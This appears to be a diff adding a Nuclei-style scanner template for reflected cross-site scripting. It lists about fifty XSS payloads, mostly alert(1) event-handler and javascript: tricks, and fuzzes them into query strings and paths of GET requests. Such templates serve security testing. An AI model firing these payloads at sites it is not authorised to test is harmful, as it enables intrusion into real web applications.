@@ -1,0 +1,95 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<style>:target {color:red;}</style><link id=x style=\"transition:color 10s\" ontransitionrun=alert(1)></link>"
+        - "<details id=x tabindex=1 onfocusin=alert(1)></details>"
+        - "<blink draggable=\"true\" ondragend=\"alert(1)\">test</blink>"
+        - "<map id=x tabindex=1 onfocusin=alert(1)></map>"
+        - "<embed data=%27http://ha.ckers.org/scriptlet.html%3Cscript>alert('XSS%3A'+String.fromCharCode(88,83,83))//alert(1)%3C/src/data=http://ha.ckers.org/scriptlet.html"
+        - "<optgroup draggable=\"true\" ondragend=\"alert(1)\">test</optgroup>"
+        - "<input autofocus id=x>"
+        - "<tt id=x tabindex=1 onbeforeactivate=alert(1)></tt><input autofocus>"
+        - "<style>@keyframes slidein {}</style><a style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></a>"
+        - "<script>alert(1)</script>"
+        - "<html:script>alert(1)</html:script>"
+        - "<plaintext onclick=\"alert(1)\">test</plaintext>"
+        - "<dl draggable=\"true\" ondragend=\"alert(1)\">test</dl>"
+        - "<marquee id=x tabindex=1 ondeactivate=alert(1)></markee><input id=y autofocus>"
+        - "<noscript onkeydown=\"alert(1)\" contenteditable>test</noscript>"
+        - "<optgroup id=x tabindex=1 onbeforeactivate=alert(1)></optgroup>"
+        - "<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input autofocus>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>"
+        - "<video onkeydown=\"alert(1)\" contenteditable>test</video>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>"
+        - "<input id=x tabindex=1 ondeactivate=alert(1)>"
+        - "<legend draggable=\"true\" ondragend=\"alert(1)\">test</legend>"
+        - "<colgroup draggable=\"true\" ondragend=\"alert(1)\">test</colgroup>"
+        - "<style>@keyframes x{}</style><input style=\"animation-name:x\" onanimationend=\"alert(1)\"></input>"
+        - "<script>alert(123);</script>"
+        - "<style>@keyframes slidein {}</style><input style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></input>"
+        - "<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>"
+        - "<frameset draggable=\"true\" ondragstart=\"alert(1)\">test</frameset>"
+        - "<form onpaste=\"alert(1)\" contenteditable>test</form>"
+        - "<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>"
+        - "<a href=\"javas\\x02cript:javascript:alert(1)\" id=\"fuzzelement1\">X</a>"
+        - "<style>:target {color:red;}</style><time id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></time>"
+        - "<picture><source srcset=\"validimage.png\"><img onload=alert(1)></picture>"
+        - "<script>alert(1)</script>"
+        - "<font draggable=\"true\" ondragend=\"alert(1)\">test</font>"
+        - "&lt;IMG SRC=&quot;x&quot;&gt;"
+        - "<script>alert(1)</script>"
+        - "<svg draggable=\"true\" ondragleave=\"alert(1)\">test</svg>"
+        - "<marquee id=x tabindex=1 onbeforeactivate=alert(1)></marquee>"
+        - "<style>@keyframes slidein {}</style><h2 style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></h2>"
+        - "<video autoplay><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>"
+        - "<style>@keyframes x{}</style><bgsound style=\"animation-name:x\" onanimationend=\"alert(1)\"></bgsound>"
+        - "<video poster=\"javascript:alert(1)\"></video>"
+        - "<time id=x tabindex=1 onfocusin=alert(1)></time>"
+        - "<optgroup id=x tabindex=1 onbeforeactivate=alert(1)></optgroup><input autofocus>"
+        - "<del draggable=\"true\" ondragend=\"alert(1)\">test</del>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
